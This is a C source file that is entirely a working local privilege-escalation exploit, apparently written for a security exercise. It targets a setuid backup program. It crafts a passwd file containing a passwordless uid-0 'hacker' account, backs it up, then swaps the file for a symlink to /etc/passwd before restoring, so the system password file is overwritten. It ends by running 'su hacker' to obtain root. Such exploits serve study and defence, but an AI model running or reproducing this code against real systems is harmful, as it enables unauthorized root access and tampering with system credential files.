#include <stdio.h>
#include <unistd.h>

//For WEXITSTATUS
#include <stdlib.h>
#include <sys/wait.h>

#define TARGET "/usr/local/bin/backup" /* or backupV2*/ 
#define NUM_ITERATION 20
 void createPasswdFile()
 {
	FILE* fd = fopen("/share/12345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901passwd", "w");
	if(fd!=NULL)
	{
		fputs("root:$1$kdTmD8IE$/4r94P17auIwqZBjhd0fk0:0:0:root:/root:/bin/bash\n", fd);
		fputs("hacker::0:0:root:/root:/bin/bash\n", fd);
		fputs("user::1000:1000::/home/user:/bin/sh\n", fd);
		fputs("halt::0:1001::/:/sbin/halt\n", fd);
		
		fclose(fd);
	}
 }
 
int main(int argc, char **argv) 
{
	char *args[4];
	char *env[1];

	remove("12345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901passwd");
	
	//Creates a password file with appended "hacker" entry in second line
	createPasswdFile();

	//Start backup
	args[0] = TARGET;
	args[1] = "backup";
	args[3] = NULL;
	
	env[0] = NULL;
	
	system("/usr/local/bin/backupV2 backup 12345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901passwd");

	
	//TTOCTU exploit starts here
	args[1] = "restore";
	
	remove("12345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901passwd");
	symlink("/etc/passwd", "12345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901passwd");
	system("/usr/local/bin/backupV2 restore 12345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901passwd");
	
	//Should get root access here. Login to hacker
	system("su hacker");
	
	return 0;
}